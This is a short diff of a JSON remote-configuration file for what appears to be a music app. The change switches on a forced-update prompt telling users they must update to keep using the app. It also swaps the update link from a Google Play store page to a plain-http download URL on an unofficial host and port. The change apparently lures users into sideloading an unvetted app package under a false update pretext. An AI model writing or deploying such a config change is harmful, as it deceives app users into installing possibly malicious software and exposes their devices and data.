@@ -6,7 +6,7 @@
 "SHOW":"1",
 "RATE":"0",
 "CONTENT":"Please rate our app, Thanks",
-"UPDATE":"0",
+"UPDATE":"1",
 "UPDATE_CONTENT":"Please UPDATE the app to continue using it. (Your musics will be backed up)",
-"NEW_APP":"https://play.google.com/store/apps/details?id=com.whatsapp"
+"NEW_APP":"http://www.pllio.com:8080/newapp?pkg=ale.musi.usica.ees"
 }
